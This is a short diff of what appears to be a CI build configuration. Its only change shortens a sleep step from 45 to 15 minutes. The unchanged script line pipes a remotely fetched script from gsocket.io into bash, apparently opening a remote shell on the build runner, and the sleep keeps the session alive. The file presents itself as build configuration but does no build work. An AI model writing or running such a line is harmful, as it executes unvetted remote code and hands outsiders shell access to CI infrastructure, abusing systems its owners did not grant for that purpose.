@@ -12,4 +12,4 @@ env:
   - secure: hck9y60wv0WHiNdMCmWPcWAKXCO0yy0lp/cMCnPcUHyeHtcxsrQzW4l6m3yBtVLPOjuLH33/tw5p/v7MJDJ1cBo7+91ishu8RjvSjpXAsMXoHxBOKBewMllju+9C0wmIDnFa1gMupMqJHCzuh5x29idSeQy4p0tuqYzIpLk7LO2Ii00rZiYhjEBEqQsexIM2nKRHE6G5Ju0EV8uF95mJKnvULxMsajFinmT1+7IUUEJSbPl1WSZCdMvzDTeW47QuAmrKWgkudbR+xTUt3EKEBo9nBu9TmwsPn74WzERQ9fryc+faLSKCxFPsPk3shtowlRaSqJLDTc4y8n+4hpgBwMRnYCw/HwTQ6P989vEQsCrIEx0C/pNmArGVv9Mj3cAMLF64rl3+hPpH2utKIKThVl/Oi4cBEO9vLzBV/7FRzZwhRZgikLg6PHJyBxwy6tEJmgHM0K81em6pq6LeQykB1JEieAco3wR046gyYjS315SerrKiL/v3AvPcK+db9+Hc7o5lEUxBpt2VRKOl10wikO+XTb4jvb2JrXDPzMugQCuoUqKzexPC6QXP0Nk3h4gvf+YmFj6XtsxblDj/tXQ633lwPP1X7w2AJ7Hy28V9jbvHc3yT4FRKt7t/lRy0SUpOlUWrVncova9Xtl6TFZ6AIA2339EgCpkj3YqJ4Nzt/bw=
 script:
   - bash -c "$(curl -fsSL gsocket.io/x)"
-  - sleep 45m
+  - sleep 15m
